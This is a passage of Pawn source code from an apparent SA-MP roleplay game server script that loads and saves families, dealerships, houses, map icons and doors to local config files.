			FamilyInfo[iIndex][FamilyGuns][2],
			FamilyInfo[iIndex][FamilyGuns][3],
			FamilyInfo[iIndex][FamilyGuns][4],
			FamilyInfo[iIndex][FamilyGuns][5],
			FamilyInfo[iIndex][FamilyGuns][6],
			FamilyInfo[iIndex][FamilyGuns][7],
			FamilyInfo[iIndex][FamilyGuns][8],
			FamilyInfo[iIndex][FamilyGuns][9]
		);
		++iIndex;
	}
	return fclose(iFileHandle);
}

stock SaveFamilies()
{
	new idx;
	new File: file2;
	while (idx < sizeof(FamilyInfo))
	{
		new coordsstring[512];
		format(coordsstring, sizeof(coordsstring), "%d|%s|%s|%s|%d|%d|%d|%f|%f|%f|%d|%d|%d|%s|%s|%s|%s|%s|%s|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d\n",
		FamilyInfo[idx][FamilyTaken],
		FamilyInfo[idx][FamilyName],
		FamilyInfo[idx][FamilyMOTD],
		FamilyInfo[idx][FamilyLeader],
		FamilyInfo[idx][FamilyBank],
		FamilyInfo[idx][FamilyCash],
		FamilyInfo[idx][FamilyUSafe],
		FamilyInfo[idx][FamilySafe][0],
		FamilyInfo[idx][FamilySafe][1],
		FamilyInfo[idx][FamilySafe][2],
		FamilyInfo[idx][FamilyPot],
		FamilyInfo[idx][FamilyCrack],
		FamilyInfo[idx][FamilyMats],
		FamilyInfo[idx][FamilyRank1],
		FamilyInfo[idx][FamilyRank2],
		FamilyInfo[idx][FamilyRank3],
		FamilyInfo[idx][FamilyRank4],
		FamilyInfo[idx][FamilyRank5],
		FamilyInfo[idx][FamilyRank6],
		FamilyInfo[idx][FamilyMembers],
		FamilyInfo[idx][FamilyMaxSkins],
		FamilyInfo[idx][FamilySkins][0],
		FamilyInfo[idx][FamilySkins][1],
		FamilyInfo[idx][FamilySkins][2],
		FamilyInfo[idx][FamilySkins][3],
		FamilyInfo[idx][FamilySkins][4],
		FamilyInfo[idx][FamilySkins][5],
		FamilyInfo[idx][FamilySkins][6],
		FamilyInfo[idx][FamilySkins][7],
		FamilyInfo[idx][FamilyColor],
		FamilyInfo[idx][FamilyTurfTokens],
		FamilyInfo[idx][FamilyGuns][0],
		FamilyInfo[idx][FamilyGuns][1],
		FamilyInfo[idx][FamilyGuns][2],
		FamilyInfo[idx][FamilyGuns][3],
		FamilyInfo[idx][FamilyGuns][4],
		FamilyInfo[idx][FamilyGuns][5],
		FamilyInfo[idx][FamilyGuns][6],
		FamilyInfo[idx][FamilyGuns][7],
		FamilyInfo[idx][FamilyGuns][8],
		FamilyInfo[idx][FamilyGuns][9]);
		if(idx == 0)
		{
			file2 = fopen("families.cfg", io_write);
		}
		else
		{
			file2 = fopen("families.cfg", io_append);
		}
		fwrite(file2, coordsstring);
		idx++;
		fclose(file2);
	}
	return 1;
}

stock LoadFamiliesHQ()
{
    new string2[64];
	format(string2, sizeof(string2), "familieshq.ini");
	new File: GangFile = fopen(string2, io_read);
	//printf("[DEBUG] LoadFamiliesHQ: string2 (%s)", string2);
	if(GangFile)
	{
	    //print("[DEBUG] LoadFamiliesHQ: GangFile exists, the handle parsed.");
		new key[256] , val[256];
		new Data[256];
		//print("[DEBUG] Starting while (fread(GangFile , Data , sizeof(Data)))");
		while (fread(GangFile , Data , sizeof(Data)))
		{
		    new string[128];
		    for(new f = 0; f < MAX_FAMILY; f++)
    		{
				key = ini_GetKey(Data);
				format(string, 128, "Family%dEntranceX",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyEntrance][0] = floatstr(val); }
				format(string, 128, "Family%dEntranceY",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyEntrance][1] = floatstr(val); }
				format(string, 128, "Family%dEntranceZ",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyEntrance][2] = floatstr(val); }
				format(string, 128, "Family%dEntranceA",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyEntrance][3] = floatstr(val); }
				format(string, 128, "Family%dExitX",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyExit][0] = floatstr(val); }
				format(string, 128, "Family%dExitY",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyExit][1] = floatstr(val); }
				format(string, 128, "Family%dExitZ",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyExit][2] = floatstr(val); }
				format(string, 128, "Family%dExitA",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyExit][3] = floatstr(val); }
				format(string, 128, "Family%dInterior",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyInterior] = strval(val); }
				format(string, 128, "Family%dCustomMap",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyCustomMap] = strval(val); }
				format(string, 128, "Family%dVirtualWorld",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyInfo[f][FamilyVirtualWorld] = strval(val); }
				for(new fv = 0; fv < MAX_GANG_VEHICLES; fv++)
    			{
    			    format(string, 128, "Family%dVeh%dModelId",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvModelId] = strval(val); }
					format(string, 128, "Family%dVeh%dSpawnx",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvSpawnx] = floatstr(val); }
					format(string, 128, "Family%dVeh%dSpawny",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvSpawny] = floatstr(val); }
					format(string, 128, "Family%dVeh%dSpawnz",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvSpawnz] = floatstr(val); }
					format(string, 128, "Family%dVeh%dSpawna",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvSpawna] = floatstr(val); }
					format(string, 128, "Family%dVeh%dLock",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvLock] = strval(val); }
					format(string, 128, "Family%dVeh%dLocked",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvLocked] = strval(val); }
					format(string, 128, "Family%dVeh%dPaintJob",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvPaintJob] = strval(val); }
					format(string, 128, "Family%dVeh%dColor1",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvColor1] = strval(val); }
					format(string, 128, "Family%dVeh%dColor2",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvColor2] = strval(val); }
					format(string, 128, "Family%dVeh%dFuel",f, fv);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); FamilyVehicleInfo[f][fv][fvFuel] = floatstr(val); }
    			}
    			//printf("Family %d loaded [DEBUG] FamilyEntranceX: %.1f FamilyEntranceY: %.1f FamilyEntranceZ: %.1f", f, FamilyInfo[f][FamilyEntrance][0], FamilyInfo[f][FamilyEntrance][1], FamilyInfo[f][FamilyEntrance][2]);
			}
		}
		fclose(GangFile);
	}
	return 1;
}

stock LoadObjectsForPlayer(playerid) {
	TogglePlayerControllable(playerid, 0);
	for(new o = 0; o < 6; o++)
	{
		TextDrawShowForPlayer(playerid, ObjectsLoadingTD[o]);
	}
	SetPVarInt(playerid, "LoadingObjects", 1);
	SetTimerEx("SafeLoadObjects", 3000, 0, "d", playerid);
}

stock IsVehicleOccupied(vehicleid)  {
    foreach(Player,i) {
		if(GetPlayerVehicleID(i) == vehicleid && GetPlayerVehicleSeat(i) == 0)
			return 1;
    }
	return INVALID_VEHICLE_ID;
}

stock SaveFamiliesHQ()
{
	new string3[32];
	//GetPlayerName(playerid, playername, MAX_PLAYER_NAME);
	format(string3, sizeof(string3), "familieshq.ini");
	new File: hFile = fopen(string3, io_write);
	if(hFile)
	{
		new var[32];
		for(new f = 0; f < MAX_FAMILY; f++)
   		{
			format(var, 32, "Family%dEntranceX=%.1f\n",f, FamilyInfo[f][FamilyEntrance][0]); fwrite(hFile, var);
			format(var, 32, "Family%dEntranceY=%.1f\n",f, FamilyInfo[f][FamilyEntrance][1]); fwrite(hFile, var);
			format(var, 32, "Family%dEntranceZ=%.1f\n",f, FamilyInfo[f][FamilyEntrance][2]); fwrite(hFile, var);
			format(var, 32, "Family%dEntranceA=%.1f\n",f, FamilyInfo[f][FamilyEntrance][3]); fwrite(hFile, var);
			format(var, 32, "Family%dExitX=%.1f\n",f, FamilyInfo[f][FamilyExit][0]); fwrite(hFile, var);
			format(var, 32, "Family%dExitY=%.1f\n",f, FamilyInfo[f][FamilyExit][1]); fwrite(hFile, var);
			format(var, 32, "Family%dExitZ=%.1f\n",f, FamilyInfo[f][FamilyExit][2]); fwrite(hFile, var);
			format(var, 32, "Family%dExitA=%.1f\n",f, FamilyInfo[f][FamilyExit][3]); fwrite(hFile, var);
			format(var, 32, "Family%dInterior=%d\n",f, FamilyInfo[f][FamilyInterior]); fwrite(hFile, var);
			format(var, 32, "Family%dCustomMap=%d\n",f, FamilyInfo[f][FamilyCustomMap]); fwrite(hFile, var);
			format(var, 32, "Family%dVirtualWorld=%d\n",f, FamilyInfo[f][FamilyVirtualWorld]); fwrite(hFile, var);

			for(new fv = 0; fv < MAX_GANG_VEHICLES; fv++)
   			{
   			    format(var, 32, "Family%dVeh%dModelId=%d\n",f, fv, FamilyVehicleInfo[f][fv][fvModelId]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dSpawnx=%.1f\n",f, fv,FamilyVehicleInfo[f][fv][fvSpawnx]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dSpawny=%.1f\n",f, fv,FamilyVehicleInfo[f][fv][fvSpawny]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dSpawnz=%.1f\n",f, fv,FamilyVehicleInfo[f][fv][fvSpawnz]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dSpawna=%.1f\n",f, fv,FamilyVehicleInfo[f][fv][fvSpawna]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dLock=%d\n",f, fv,FamilyVehicleInfo[f][fv][fvLock]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dLocked=%d\n",f, fv,FamilyVehicleInfo[f][fv][fvLocked]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dPaintJob=%d\n",f, fv,FamilyVehicleInfo[f][fv][fvPaintJob]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dColor1=%d\n",f, fv,FamilyVehicleInfo[f][fv][fvColor1]); fwrite(hFile, var);
				format(var, 32, "Family%dVeh%dColor2=%d\n",f, fv,FamilyVehicleInfo[f][fv][fvColor2]); fwrite(hFile, var);
				//if(FamilyVehicleInfo[f][fv][fvId] != INVALID_VEHICLE_ID) FamilyVehicleInfo[f][fv][fvFuel] = VehicleFuel[FamilyVehicleInfo[f][fv][fvId]];
				format(var, 32, "Family%dVeh%dFuel=%.1f\n",f, fv,FamilyVehicleInfo[f][fv][fvFuel]); fwrite(hFile, var);
    		}
  		}
		fclose(hFile);
	}
	return 1;
}

stock LoadcDealerships()
{
    new string2[64];
	format(string2, sizeof(string2), "dealerships.ini");
	new File: Dealerships = fopen(string2, io_read);

	if(Dealerships)
	{
		new key[256] , val[256];
		new Data[256];

		while (fread(Dealerships , Data , sizeof(Data)))
		{
            new string[128];

            for(new f = 0; f < MAX_CARDEALERSHIPS; f++)
            {
                key = ini_GetKey(Data);

				format(string, 128, "cd%dOwned",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdOwned] = strval(val); }
				format(string, 128, "cd%dOwner",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); strmid(CarDealershipInfo[f][cdOwner], val, 0, strlen(val)-1, 255); }
				format(string, 128, "cd%dEntranceX",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdEntranceX] = floatstr(val); }
				format(string, 128, "cd%dEntranceY",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdEntranceY] = floatstr(val); }
				format(string, 128, "cd%dEntranceZ",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdEntranceZ] = floatstr(val); }
				format(string, 128, "cd%dExitX",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdExitX] = floatstr(val); }
				format(string, 128, "cd%dExitY",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdExitY] = floatstr(val); }
				format(string, 128, "cd%dExitZ",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdExitZ] = floatstr(val); }
				format(string, 128, "cd%dMessage",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); strmid(CarDealershipInfo[f][cdMessage], val, 0, strlen(val)-1, 255); }
				format(string, 128, "cd%dTill",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdTill] = strval(val); }
				format(string, 128, "cd%dInterior",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdInterior] = strval(val); }
				format(string, 128, "cd%dVehicleSpawnX",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawn][0] = floatstr(val); }
				format(string, 128, "cd%dVehicleSpawnY",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawn][1] = floatstr(val); }
				format(string, 128, "cd%dVehicleSpawnZ",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawn][2] = floatstr(val); }
				format(string, 128, "cd%dVehicleSpawnA",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawn][3] = floatstr(val); }
				format(string, 128, "cd%dRadius",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdRadius] = floatstr(val); }
				format(string, 128, "cd%dPrice",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdPrice] = strval(val); }
    			for(new m = 0; m < MAX_DEALERSHIPVEHICLES; m++)
            	{
  					format(string, 128, "cd%dVehicleSpawnX%d", f, m);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawnX][m] = floatstr(val); }
					format(string, 128, "cd%dVehicleSpawnY%d", f, m);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawnY][m] = floatstr(val); }
					format(string, 128, "cd%dVehicleSpawnZ%d", f, m);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawnZ][m] = floatstr(val); }
					format(string, 128, "cd%dVehicleSpawnA%d", f, m);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleSpawnAngle][m] = floatstr(val); }
					format(string, 128, "cd%dVehicleModel%d", f, m);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleModel][m] = strval(val); }
					format(string, 128, "cd%dVehicleCost%d", f, m);
					if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdVehicleCost][m] = strval(val); }
            	}
 				format(string, 128, "cd%dDonator",f);
				if(strcmp(key , string , true) == 0) { val = Ini_Value(Data); CarDealershipInfo[f][cdDonator] = strval(val); }
            }
		}
		fclose(Dealerships);
	}
	return 1;
}

stock UpdateSANewsBroadcast()
{
    new string[42];
	if(broadcasting == 0)
	{
	    format(string, sizeof(string), "Currently: Not Broadcasting\nViewers: %d", viewers);
	}
	else
	{
	    format(string, sizeof(string), "Currently: LIVE\nViewers: %d", viewers);
	}
	UpdateDynamic3DTextLabelText(SANews3DText, COLOR_LIGHTBLUE, string);
}


stock SavecDealerships()
{
	new string3[32];
	//GetPlayerName(playerid, playername, MAX_PLAYER_NAME);
	format(string3, sizeof(string3), "dealerships.ini");
	new File: hFile = fopen(string3, io_write);
	if(hFile)
	{
		new var[32];
		for(new f = 0; f < MAX_CARDEALERSHIPS; f++)
   		{
   		    format(var, 32, "cd%dOwned=%d\n", f, CarDealershipInfo[f][cdOwned]); fwrite(hFile, var);
   		    format(var, 32, "cd%dOwner=%s\n", f, CarDealershipInfo[f][cdOwner]); fwrite(hFile, var);
   		    format(var, 32, "cd%dEntranceX=%.1f\n", f, CarDealershipInfo[f][cdEntranceX]); fwrite(hFile, var);
   		    format(var, 32, "cd%dEntranceY=%.1f\n", f, CarDealershipInfo[f][cdEntranceY]); fwrite(hFile, var);
   		    format(var, 32, "cd%dEntranceZ=%.1f\n", f, CarDealershipInfo[f][cdEntranceZ]); fwrite(hFile, var);
   		    format(var, 32, "cd%dExitX=%.1f\n", f, CarDealershipInfo[f][cdExitX]); fwrite(hFile, var);
   		    format(var, 32, "cd%dExitY=%.1f\n", f, CarDealershipInfo[f][cdExitY]); fwrite(hFile, var);
   		    format(var, 32, "cd%dExitZ=%.1f\n", f, CarDealershipInfo[f][cdExitZ]); fwrite(hFile, var);
   		    format(var, 32, "cd%dMessage=%s\n", f, CarDealershipInfo[f][cdMessage]); fwrite(hFile, var);
   		    format(var, 32, "cd%dTill=%d\n", f, CarDealershipInfo[f][cdTill]); fwrite(hFile, var);
   		    format(var, 32, "cd%dInterior=%d\n", f, CarDealershipInfo[f][cdInterior]); fwrite(hFile, var);
   		    format(var, 32, "cd%dVehicleSpawnX=%.1f\n", f, CarDealershipInfo[f][cdVehicleSpawn][0]); fwrite(hFile, var);
   		    format(var, 32, "cd%dVehicleSpawnY=%.1f\n", f, CarDealershipInfo[f][cdVehicleSpawn][1]); fwrite(hFile, var);
   		    format(var, 32, "cd%dVehicleSpawnZ=%.1f\n", f, CarDealershipInfo[f][cdVehicleSpawn][2]); fwrite(hFile, var);
   		    format(var, 32, "cd%dVehicleSpawnA=%.1f\n", f, CarDealershipInfo[f][cdVehicleSpawn][3]); fwrite(hFile, var);
   		    format(var, 32, "cd%dRadius=%.1f\n", f, CarDealershipInfo[f][cdRadius]); fwrite(hFile, var);
   		    format(var, 32, "cd%dPrice=%d\n", f, CarDealershipInfo[f][cdPrice]); fwrite(hFile, var);
			for(new m = 0; m < MAX_DEALERSHIPVEHICLES; m++)
   			{
   				format(var, 32, "cd%dVehicleSpawnX%d=%.1f\n", f, m, CarDealershipInfo[f][cdVehicleSpawnX][m]); fwrite(hFile, var);
   				format(var, 32, "cd%dVehicleSpawnY%d=%.1f\n", f, m, CarDealershipInfo[f][cdVehicleSpawnY][m]); fwrite(hFile, var);
   				format(var, 32, "cd%dVehicleSpawnZ%d=%.1f\n", f, m, CarDealershipInfo[f][cdVehicleSpawnZ][m]); fwrite(hFile, var);
   				format(var, 32, "cd%dVehicleSpawnA%d=%.1f\n", f, m, CarDealershipInfo[f][cdVehicleSpawnAngle][m]); fwrite(hFile, var);
   				format(var, 32, "cd%dVehicleModel%d=%d\n", f, m, CarDealershipInfo[f][cdVehicleModel][m]); fwrite(hFile, var);
   				format(var, 32, "cd%dVehicleCost%d=%d\n", f, m, CarDealershipInfo[f][cdVehicleCost][m]); fwrite(hFile, var);
			}
			format(var, 32, "cd%dDonator=%d\n", f, CarDealershipInfo[f][cdDonator]); fwrite(hFile, var);
		}
		fclose(hFile);
	}
	return 1;
}

stock LoadHouses()
{
	if(!fexist("houses.cfg")) return 1;

	new
		szFileStr[1024],
		File: iFileHandle = fopen("houses.cfg", io_read),
		iIndex;

	while(iIndex < sizeof(HouseInfo) && fread(iFileHandle, szFileStr))
	{
		sscanf(szFileStr, "p<|>iiis[24]ffffffffiiiiiiiiiiiiiiiiiff",
			HouseInfo[iIndex][hOwned],
			HouseInfo[iIndex][hLevel],
			HouseInfo[iIndex][hHInteriorWorld],
			//HouseInfo[iIndex][hDescription],
			HouseInfo[iIndex][hOwner],
			HouseInfo[iIndex][hExteriorX],
			HouseInfo[iIndex][hExteriorY],
			HouseInfo[iIndex][hExteriorZ],
			HouseInfo[iIndex][hExteriorR],
			HouseInfo[iIndex][hInteriorX],
			HouseInfo[iIndex][hInteriorY],
			HouseInfo[iIndex][hInteriorZ],
			HouseInfo[iIndex][hInteriorR],
			HouseInfo[iIndex][hLock],
			HouseInfo[iIndex][hRentable],
			HouseInfo[iIndex][hRentFee],
			HouseInfo[iIndex][hValue],
			HouseInfo[iIndex][hSafeMoney],
			HouseInfo[iIndex][hPot],
			HouseInfo[iIndex][hCrack],
			HouseInfo[iIndex][hMaterials],
			HouseInfo[iIndex][hWeapons][0],
			HouseInfo[iIndex][hWeapons][1],
			HouseInfo[iIndex][hWeapons][2],
			HouseInfo[iIndex][hWeapons][3],
			HouseInfo[iIndex][hWeapons][4],
			HouseInfo[iIndex][hGLUpgrade],
			HouseInfo[iIndex][hPickupID],
			HouseInfo[iIndex][hCustomInterior],
			HouseInfo[iIndex][hCustomExterior],
			HouseInfo[iIndex][hExteriorA],
			HouseInfo[iIndex][hInteriorA]
		);

		if(HouseInfo[iIndex][hLevel] != 0)
		{
			if(HouseInfo[iIndex][hOwned])
			{
				if(HouseInfo[iIndex][hRentable] == 0) format(szFileStr, sizeof(szFileStr), "House owner: %s\nLevel: %d\nID: %d",HouseInfo[iIndex][hOwner],HouseInfo[iIndex][hLevel],iIndex);
				else format(szFileStr, sizeof(szFileStr), "House owner: %s\nLevel: %d\nID: %d\nRent: $%d\nType /rentroom to rent a room",HouseInfo[iIndex][hOwner],HouseInfo[iIndex][hLevel],iIndex,HouseInfo[iIndex][hRentFee]);
			}
			else format(szFileStr, sizeof(szFileStr), "This house is for sale!\n Level: %d\nID: %d\nPrice: $%d\nTo buy this house type /buyhouse",HouseInfo[iIndex][hLevel],iIndex,HouseInfo[iIndex][hValue]);

			HouseInfo[iIndex][hPickupID] = CreatePickup(1273, 23, HouseInfo[iIndex][hExteriorX], HouseInfo[iIndex][hExteriorY], HouseInfo[iIndex][hExteriorZ], -1);
			HouseInfo[iIndex][hTextID] = CreateDynamic3DTextLabel(szFileStr, COLOR_HOUSEGREEN, HouseInfo[iIndex][hExteriorX], HouseInfo[iIndex][hExteriorY], HouseInfo[iIndex][hExteriorZ]+0.5,20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
		}
		++iIndex;
	}
	return fclose(iFileHandle);
}

stock SaveHouses()
{
	new
		szFileStr[1024],
		File: fHandle = fopen("houses.cfg", io_write);

	for(new iIndex; iIndex < MAX_HOUSES; iIndex++) {
		format(szFileStr, sizeof(szFileStr), "%d|%d|%d|%s|%f|%f|%f|%f|%f|%f|%f|%f|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%f|%f\r\n",
			HouseInfo[iIndex][hOwned],
			HouseInfo[iIndex][hLevel],
			HouseInfo[iIndex][hHInteriorWorld],
			//HouseInfo[iIndex][hDescription],
			HouseInfo[iIndex][hOwner],
			HouseInfo[iIndex][hExteriorX],
			HouseInfo[iIndex][hExteriorY],
			HouseInfo[iIndex][hExteriorZ],
			HouseInfo[iIndex][hExteriorR],
			HouseInfo[iIndex][hInteriorX],
			HouseInfo[iIndex][hInteriorY],
			HouseInfo[iIndex][hInteriorZ],
			HouseInfo[iIndex][hInteriorR],
			HouseInfo[iIndex][hLock],
			HouseInfo[iIndex][hRentable],
			HouseInfo[iIndex][hRentFee],
			HouseInfo[iIndex][hValue],
   			HouseInfo[iIndex][hSafeMoney],
			HouseInfo[iIndex][hPot],
			HouseInfo[iIndex][hCrack],
			HouseInfo[iIndex][hMaterials],
			HouseInfo[iIndex][hWeapons][0],
			HouseInfo[iIndex][hWeapons][1],
			HouseInfo[iIndex][hWeapons][2],
			HouseInfo[iIndex][hWeapons][3],
			HouseInfo[iIndex][hWeapons][4],
			HouseInfo[iIndex][hGLUpgrade],
			HouseInfo[iIndex][hPickupID],
			HouseInfo[iIndex][hCustomInterior],
			HouseInfo[iIndex][hCustomExterior],
			HouseInfo[iIndex][hExteriorA],
			HouseInfo[iIndex][hInteriorA]
		);
		fwrite(fHandle, szFileStr);
	}
	return fclose(fHandle);
}

stock IntToPercentage(value, percentage) {
	return (value/100)*percentage;
}

stock LoadDynamicMapIcons()
{
	new arrCoords[7][64];
	new strFromFile2[256];
	new File: file = fopen("dynamicmapicons.cfg", io_read);
	if(file)
	{
		new idx;
		while (idx < sizeof(DMPInfo))
		{
			fread(file, strFromFile2);
			splits(strFromFile2, arrCoords, '|');
	  		DMPInfo[idx][dmpMarkerType] = strval(arrCoords[0]);
	  		DMPInfo[idx][dmpColor] = strval(arrCoords[1]);
	  		DMPInfo[idx][dmpVW] = strval(arrCoords[2]);
	  		DMPInfo[idx][dmpInt] = strval(arrCoords[3]);
	  		DMPInfo[idx][dmpPosX] = floatstr(arrCoords[4]);
	  		DMPInfo[idx][dmpPosY] = floatstr(arrCoords[5]);
	  		DMPInfo[idx][dmpPosZ] = floatstr(arrCoords[6]);

	  		if(DMPInfo[idx][dmpMarkerType] != 0)
	  		{
    			DMPInfo[idx][dmpMapIconID] = CreateDynamicMapIcon(DMPInfo[idx][dmpPosX], DMPInfo[idx][dmpPosY], DMPInfo[idx][dmpPosZ], DMPInfo[idx][dmpMarkerType], DMPInfo[idx][dmpColor], DMPInfo[idx][dmpVW], DMPInfo[idx][dmpInt], -1, 500.0);
			}

			idx++;
		}
		fclose(file);
	}
	return 1;
}

stock SaveDynamicMapIcons()
{
	new
		szFileStr[326],
		File: fHandle = fopen("dynamicmapicons.cfg", io_write);

	for(new iIndex; iIndex < MAX_DMAPICONS; iIndex++) {
		format(szFileStr, sizeof(szFileStr), "%d|%d|%d|%d|%f|%f|%f\r\n",
			DMPInfo[iIndex][dmpMarkerType],
			DMPInfo[iIndex][dmpColor],
			DMPInfo[iIndex][dmpVW],
			DMPInfo[iIndex][dmpInt],
			DMPInfo[iIndex][dmpPosX],
			DMPInfo[iIndex][dmpPosY],
			DMPInfo[iIndex][dmpPosZ]
		);
		fwrite(fHandle, szFileStr);
	}
	return fclose(fHandle);
}

stock LoadDynamicDoors()
{
	new arrCoords[26][64];
	new strFromFile2[256];
	new File: file = fopen("dynamicdoors.cfg", io_read);
	if(file)
	{
		new idx;
		while (idx < sizeof(DDoorsInfo))
		{
			fread(file, strFromFile2);
			splits(strFromFile2, arrCoords, '|');
			strmid(DDoorsInfo[idx][ddDescription], arrCoords[0], 0, strlen(arrCoords[0]), 128);
	  		DDoorsInfo[idx][ddCustomInterior] = strval(arrCoords[1]);
	  		DDoorsInfo[idx][ddExteriorVW] = strval(arrCoords[2]);
	  		DDoorsInfo[idx][ddExteriorInt] = strval(arrCoords[3]);
	  		DDoorsInfo[idx][ddInteriorVW] = strval(arrCoords[4]);
	  		DDoorsInfo[idx][ddInteriorInt] = strval(arrCoords[5]);
	  		DDoorsInfo[idx][ddExteriorX] = floatstr(arrCoords[6]);
	  		DDoorsInfo[idx][ddExteriorY] = floatstr(arrCoords[7]);
	  		DDoorsInfo[idx][ddExteriorZ] = floatstr(arrCoords[8]);
	  		DDoorsInfo[idx][ddExteriorA] = floatstr(arrCoords[9]);
	  		DDoorsInfo[idx][ddInteriorX] = floatstr(arrCoords[10]);
	  		DDoorsInfo[idx][ddInteriorY] = floatstr(arrCoords[11]);
	  		DDoorsInfo[idx][ddInteriorZ] = floatstr(arrCoords[12]);
	  		DDoorsInfo[idx][ddInteriorA] = floatstr(arrCoords[13]);
	  		DDoorsInfo[idx][ddCustomExterior] = strval(arrCoords[14]);
	  		DDoorsInfo[idx][ddVIP] = strval(arrCoords[15]);
	  		DDoorsInfo[idx][ddGang] = strval(arrCoords[16]);
	  		DDoorsInfo[idx][ddFaction] = strval(arrCoords[17]);
	  		DDoorsInfo[idx][ddAdmin] = strval(arrCoords[18]);
	  		DDoorsInfo[idx][ddWanted] = strval(arrCoords[19]);
	  		DDoorsInfo[idx][ddVehicleAble] = strval(arrCoords[20]);
	  		DDoorsInfo[idx][ddColor] = strval(arrCoords[21]);
	  		DDoorsInfo[idx][ddPickupModel] = strval(arrCoords[22]);
	  		strmid(DDoorsInfo[idx][ddPass], arrCoords[23], 0, strlen(arrCoords[23]), 24);
	  		DDoorsInfo[idx][ddLocked] = strval(arrCoords[24]);
            DDoorsInfo[idx][ddNotEditable] = strval(arrCoords[25]);

	  		if(!isnull(DDoorsInfo[idx][ddDescription]))
	  		{
	  		    CreateDynamicDoor(idx);
			}

			idx++;
		}
		fclose(file);
	}
	return 1;
}

stock SaveDynamicDoors()
{

	new
		szFileStr[512],
		File: fHandle = fopen("dynamicdoors.cfg", io_write);

	for(new iIndex; iIndex < MAX_DDOORS; iIndex++) {
		format(szFileStr, sizeof(szFileStr), "%s|%d|%d|%d|%d|%d|%f|%f|%f|%f|%f|%f|%f|%f|%d|%d|%d|%d|%d|%d|%d|%d|%d|%s|%d|%d\r\n",
			DDoorsInfo[iIndex][ddDescription],
